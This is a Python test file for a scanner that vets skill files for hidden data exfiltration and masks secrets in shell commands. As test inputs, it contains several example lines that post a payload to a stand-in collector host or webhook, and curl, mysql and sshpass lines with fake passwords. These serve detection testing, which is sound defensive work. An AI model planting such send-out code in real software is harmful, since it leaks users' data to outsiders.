"""Batch 5 PR A, Codex recheck 3 (4 highs, 1 medium on 77dedd1).

Every test marked "replay" fails on 77dedd1 on its assertion (measured with 77dedd1's watchtower/, rules and routines and this
file in place); "guard" ones keep what must not change. All secrets are fake, and no platform folder of this computer is opened."""
import gzip, json, os, shutil, sys, unittest
from unittest import mock
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_boxes import Box, ROOT, wt
from test_batch4_codex_review3 import Folder, History, HOOK, ev, vet_json
import test_batch5_codex_r2 as r2
from test_batch5_codex_r2 import rules_of, fenced

COLLECTOR = "config = {'hook': 'https://collector.example'}\n"


# ---------------------------------------------------------------- 1: a lookup or a collection doesn't establish the destination
class LookupsAndCollections(Folder):
    CODEX = COLLECTOR + "requests.post(config.get('hook', '" + HOOK + "'), json=payload)"
    VIA_VARIABLE = ("url = config.get('" + HOOK + "')\nrequests.post(url, json=payload)",                  # Codex's (key)
                    COLLECTOR + "url = config.get('hook', '" + HOOK + "')\nrequests.post(url, json=payload)",
                    "url = os.environ.get('" + HOOK + "')\nrequests.post(url, json=payload)")
    CONFIG_PARSER = ("import configparser\ncfg = configparser.ConfigParser()\ncfg.read_string('[chat]\\nhook = https://collector.example\\n')\n"
                     "requests.post(cfg.get('chat', 'hook', fallback='" + HOOK + "'), json=payload)",   # Codex's in-memory replay
                     "import configparser\ncfg = configparser.ConfigParser()\ncfg.read('settings.ini')\n"
                     "requests.post(cfg.get('chat', '" + HOOK + "'), json=payload)",                      # the option name
                     "import configparser\ncfg = configparser.ConfigParser()\ncfg.read('settings.ini')\n"
                     "requests.post(cfg.get('chat', 'hook', fallback='" + HOOK + "'), json=payload)")
    COLLECTIONS = ("config = {'hook': 'https://collector.example', 'discord': '" + HOOK + "'}\nrequests.post(config['hook'], json=payload)",
                   "hooks = ['https://collector.example', '" + HOOK + "']\nrequests.post(hooks[0], json=payload)",
                   "hooks = ('" + HOOK + "', 'https://collector.example')\nrequests.post(hooks[1], json=payload)",
                   "config = {'discord': '" + HOOK + "'}\nrequests.post(config['api'], json=payload)\nAPI = 'https://collector.example'")

    def test_the_codex_overridden_default_is_critical(self):   # replay (77dedd1: Install with changes, WT-T018)
        code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX)))
        self.assertEqual(r["verdict"], "Do not install")
        # batch 6 (B7): vet shows the audit's labelled severity; the rule's own is severity_was
        self.assertIn(("WT-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
        self.assertNotIn("WT-T018", [f["rule"] for f in r["findings"]])

    def test_a_lookup_through_a_variable_is_not_the_destination(self):   # replay (77dedd1: WT-T018 for each)
        for c in self.VIA_VARIABLE:
            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)

    def test_a_config_parser_reads_its_options_from_a_file(self):   # replay (77dedd1: WT-T018 for each)
        for c in self.CONFIG_PARSER:
            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)

    def test_one_element_of_a_collection_with_another_url_is_critical(self):   # replay (77dedd1: WT-T018 for each)
        for c in self.COLLECTIONS:
            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)

    def test_safe_forms_stay_chat_webhooks(self):   # guard (round 2's safe defaults run unmodified in test_batch5_codex_r2)
        # batch 6 (KL1, Codex #15 high 1): an unknown config may hold another destination: WT-T005 (was T018)
        self.assertEqual(rules_of(fenced("url = config.get('hook', '" + HOOK + "')\nrequests.post(url, json=payload)")), {"WT-T005"})
        # batch 7b (decision: Option A): a lookup, a collection, a name or a wrapped literal is never a recognised send (were WT-T018)
        for c in ("config = {}\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",
                  "config = {'hook': '" + HOOK + "'}\nrequests.post(config['hook'], json=payload)",
                  "hooks = ['" + HOOK + "', '" + r2.SLACK + "']\nfor h in hooks:\n    requests.post(h, json=payload)",
                  "WEBHOOK = '" + HOOK + "'\nrequests.post(WEBHOOK, json=payload)",
                  "requests.post(('" + HOOK + "'), json=payload)"):
            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)


# ---------------------------------------------------------------- 5: an HTTP client's GET is a GET, whatever its other arguments
class HttpGets(Folder):
    CODEX = (("python", "requests.get('" + HOOK + "', params)"), ("js", "https.get('" + HOOK + "', namedCallback)"))

    def test_the_codex_gets_are_chat_webhooks(self):   # replay (77dedd1: Do not install, WT-T005)
        lang, c = self.CODEX[0]
        code, r = vet_json(self.write("SKILL.md", fenced(c, lang)))
        self.assertNotEqual(r["verdict"], "Do not install", c)
        self.assertIn("WT-T018", [f["rule"] for f in r["findings"]], c)
        self.assertNotIn("WT-T005", [f["rule"] for f in r["findings"]], c)
        # batch 7b: the https module's get is not a recognised send: Do not install, WT-T005 (was Install with changes, WT-T018)
        lang, c = self.CODEX[1]
        code, r = vet_json(self.write("SKILL.md", fenced(c, lang)))
        self.assertEqual(r["verdict"], "Do not install", c)
        self.assertIn("WT-T005", [f["rule"] for f in r["findings"]], c)
        self.assertNotIn("WT-T018", [f["rule"] for f in r["findings"]], c)

    def test_other_http_clients(self):   # replay (77dedd1: WT-T005 for each)
        self.assertEqual(rules_of(fenced("httpx.get('" + HOOK + "', params)")), {"WT-T018"})
        # batch 7b: a session, a client, the http module and an axios get with two arguments are not recognised sends (were WT-T018)
        for lang, c in (("python", "self.session = requests.Session()\nself.session.get('" + HOOK + "', params, timeout)"),
                        ("python", "client = httpx.Client()\nclient.get('" + HOOK + "', headers)"),
                        ("js", "http.get('" + HOOK + "', onResponse)"),
                        ("js", "axios.get('" + HOOK + "', config)")):
            self.assertEqual(rules_of(fenced(c, lang)), {"WT-T005"}, c)

    def test_a_lookup_named_get_is_still_a_lookup(self):   # guard
        for c in ("requests.post(config.get('" + HOOK + "', params))", "requests.post(os.environ.get('" + HOOK + "'))",
                  "url = settings.get('" + HOOK + "', other)\nrequests.post(url)"):
            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)


# ---------------------------------------------------------------- 2: a short credential after a joined flag or tool
SHORT = ("curl --us\\\ner 'admin:FAKEz' https://x.example",   # Codex's three
         "my\\\nsql -pFAKEz -h db.example",
         "curl --tok\\\nen FAKEz https://x.example",
         "curl -\\\nu admin:FAKEz https://x.example",
         "sshpass -\\\np FAKEz ssh host.example",
         "/usr/bin/mar\\\niadb -p'FAKEz' -h db.example",
         "curl --pass\\\nword FAKEz https://x.example")


class ShortAfterJoins(History):
    def test_each_is_hidden(self):   # replay (77dedd1 kept FAKEz)
        for line in SHORT:
            for got in (wt.mask_secrets(line), ev(line)):
                self.assertNotIn("FAKEz", got, line)
                self.assertIn("example", got, line)
            self.assertEqual(wt.mask_secrets(line).count("\n"), line.count("\n"), line)

    def test_in_an_approved_copy(self):   # replay (77dedd1 kept FAKEz in the copy)
        doc = self.copy_of("Run these:\n```\n" + "\n".join(SHORT) + "\n```\nAsk before saving.")
        self.assertNotIn("FAKEz", doc)
        self.assertIn("Ask before saving.", doc)
        self.assertEqual(json.loads(doc)["masked"], 10)   # batch 7d: MASK_VERSION 10 (was 9; batch 7a: 9, was 8)

    def test_copies_masked_by_version_6_are_masked_again(self):   # replay (77dedd1's marker 6 left them as they were)
        d = self.skills(1)[0]
        self.audit()
        old = {"dir": d, "at": wt.now(), "hash": wt.skill_dir_hash(d), "hashes": {"SKILL.md": wt.sha256_file(os.path.join(d, "SKILL.md"))},
               "files": {"SKILL.md": "curl --us\\\ner 'admin:FAKEmarked' https://x.example\n"}, "masked": 6}
        with gzip.open(wt.approved_path(d), "wt") as f:
            json.dump(old, f)
        with open(wt.state_path("approved_masked"), "w") as f:
            f.write("6 " + wt.now() + "\n")   # what 77dedd1 wrote
        self.audit()
        with gzip.open(wt.approved_path(d), "rt") as f:
            doc = json.load(f)
        self.assertNotIn("FAKEmarked", json.dumps(doc))
        self.assertEqual(doc["masked"], wt.MASK_VERSION)

    def test_other_joined_words_stay_readable(self):   # guard
        for s in ("curl --out\\\nput out.txt https://x.example", "my\\\nsql -P3306 -h db.example", "ss\\\nh -p 22 host.example",
                  "curl --us\\\ner \"$CREDS\" https://x.example", "echo a\nmysql -h db.example\nls -p"):
            self.assertEqual(wt.mask_secrets(s), s, s)


# ---------------------------------------------------------------- 3: a renamed installation is still the installation
class RenamedInstall(Box):
    install, plant, forget = r2.CanonicalInstall.install, r2.CanonicalInstall.plant, r2.CanonicalInstall.forget
    PROBE, run_probe, installed_sources = r2.CanonicalInstall.PROBE, r2.CanonicalInstall.run_probe, r2.CanonicalInstall.installed_sources

    def moved(self, link):
        """The installation with its sources, the reviewed list planted, then `mv app app.real` (and `ln -s app.real app`)."""
        self.install()
        self.installed_sources()
        self.plant()
        real = os.path.join(self.wth, "app.real")
        os.rename(self.app, real)
        if link:
            os.symlink(real, self.app)
        return real

    def check(self, real, start):
        got = self.run_probe(os.path.join(start, "watchtower"), self.wth)
        self.assertEqual(got["root"], os.path.realpath(real))
        self.assertIsNotNone(got["problems"])
        self.assertIn(f"{wt.PLATFORM_REVIEWED_REL} changed since install", got["problems"])
        self.assertIn("MANIFEST.sha256", got["reviewed"])

    def test_the_codex_link_layout_refuses_the_planted_list(self):   # replay (77dedd1: root None, planted list accepted)
        real = self.moved(link=True)
        self.check(real, self.app)
        self.check(real, real)

    def test_a_plain_rename_refuses_it_too(self):   # replay (77dedd1: root None)
        real = self.moved(link=False)
        self.check(real, real)

    def test_in_process_with_another_home(self):   # replay (77dedd1: no self-check)
        self.install()
        self.plant()
        real = os.path.join(self.wth, "renamed")
        os.rename(self.app, real)
        other = os.path.join(self.tmp, "elsewhere")
        os.makedirs(other)
        with mock.patch.object(wt, "SELF_ROOT", real), mock.patch.object(wt, "PLATFORM_REVIEWED", os.path.join(real, wt.PLATFORM_REVIEWED_REL)), \
                mock.patch.dict(os.environ, {"WATCHTOWER_HOME": other}):
            self.forget()
            self.assertEqual(wt.installed_root(), os.path.realpath(real))
            self.assertIn(f"{wt.PLATFORM_REVIEWED_REL} changed since install", wt.self_check())
            self.assertIn("MANIFEST.sha256", wt.platform_reviewed_problem())

    def test_a_folder_without_the_commit_record_is_still_a_checkout(self):   # guard
        self.install()
        real = os.path.join(self.tmp, "src", "watchtower-copy")
        os.makedirs(os.path.dirname(real))
        os.rename(self.app, real)
        with mock.patch.object(wt, "SELF_ROOT", real):
            self.forget()
            self.assertIsNone(wt.installed_root())
            self.assertIsNone(wt.self_check())


# ---------------------------------------------------------------- 4: the routine's cap never cuts an alert
from test_batch5_platform_notes import _SignIn


class DailyCap(_SignIn):
    day, start = r2.DailyOverflow.day, r2.DailyOverflow.start

    def test_seven_owner_highs_all_reach_the_owner(self):   # replay (77dedd1: the routine's 6 lines had no room for them)
        highs = [r2.owner_high(self.home, i) for i in range(7)]
        snap = self.start(highs)
        r = self.day(snap, highs)
        self.assertEqual([f["where"] for f in r["new"]], [f["where"] for f in highs])
        self.assertNotIn("undelivered", r)
        with open(os.path.join(ROOT, "routines", "daily-watch.md")) as f:
            routine = f.read()
        self.assertIn("Never cut to fit either, and never counted in the 6: every critical or high finding in `new` (one line each), "
                      "every `platform_notes` line that says ISR Bot would call it critical or high (one line each)", routine)
        self.assertIn("The 6 lines are only for everything else", routine)

    def test_what_overflows_is_still_owed(self):   # guard (round 2's overflow runs unmodified in test_batch5_codex_r2)
        highs = [r2.owner_high(self.home, i) for i in range(12)]
        snap = self.start(highs)
        r = self.day(snap, highs)
        self.assertEqual(r["undelivered"]["count"], 2)
        self.assertIsInstance(self.day(self.snap(), []), dict)


if __name__ == "__main__":
    unittest.main()
